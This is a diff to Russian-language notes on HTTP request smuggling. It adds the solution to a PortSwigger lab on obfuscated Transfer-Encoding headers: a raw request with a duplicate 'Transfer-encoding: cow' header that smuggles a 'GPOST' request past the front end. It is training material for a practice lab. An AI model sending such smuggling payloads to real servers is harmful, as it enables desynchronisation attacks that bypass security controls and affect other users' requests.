@@ -86,6 +86,27 @@ Transfer-Encoding
 
 PortSwigger Lab: [https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)
 
+Решение:
+
+```
+POST / HTTP/1.1
+Host: 0a88004804c128e6c0680d67009f0082.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+```
+
 ### 2xCL
 
 Использование двух `Content-Length` — где-то может взяться первый `Content-Length`, а на другом сервере — второй
